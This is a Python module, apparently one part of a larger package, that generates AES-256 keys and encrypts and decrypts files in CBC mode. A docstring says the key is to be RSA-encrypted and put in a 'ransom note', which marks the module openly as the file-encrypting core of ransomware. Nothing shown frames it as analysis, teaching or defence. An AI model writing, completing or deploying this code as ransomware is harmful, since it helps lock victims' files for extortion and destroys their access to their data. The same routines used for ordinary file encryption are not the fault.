from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

from .utils import random_bytes, AES_KEY_SIZE, AES_BLOCK_SIZE


def generate_aes_key() -> bytes:
    """
    Generate a fresh 256-bit AES key.
    This key will be encrypted by RSA and included in the ransom note.
    """
    return random_bytes(AES_KEY_SIZE)


def encrypt_file_aes(in_path: str, out_path: str, key: bytes) -> None:
    """
    Encrypt a file using AES-256 in CBC mode.

    File format:
        [16-byte IV][AES-CBC(ciphertext)]
    """
    iv = random_bytes(AES_BLOCK_SIZE)
    cipher = AES.new(key, AES.MODE_CBC, iv)

    with open(in_path, "rb") as f:
        data = f.read()

    ciphertext = cipher.encrypt(pad(data, AES_BLOCK_SIZE))

    with open(out_path, "wb") as f:
        f.write(iv + ciphertext)


def decrypt_file_aes(in_path: str, out_path: str, key: bytes) -> None:
    """
    Decrypt a file previously encrypted by encrypt_file_aes.
    """
    with open(in_path, "rb") as f:
        raw = f.read()

    iv = raw[:AES_BLOCK_SIZE]
    ciphertext = raw[AES_BLOCK_SIZE:]

    cipher = AES.new(key, AES.MODE_CBC, iv)
    plaintext = unpad(cipher.decrypt(ciphertext), AES_BLOCK_SIZE)

    with open(out_path, "wb") as f:
        f.write(plaintext)
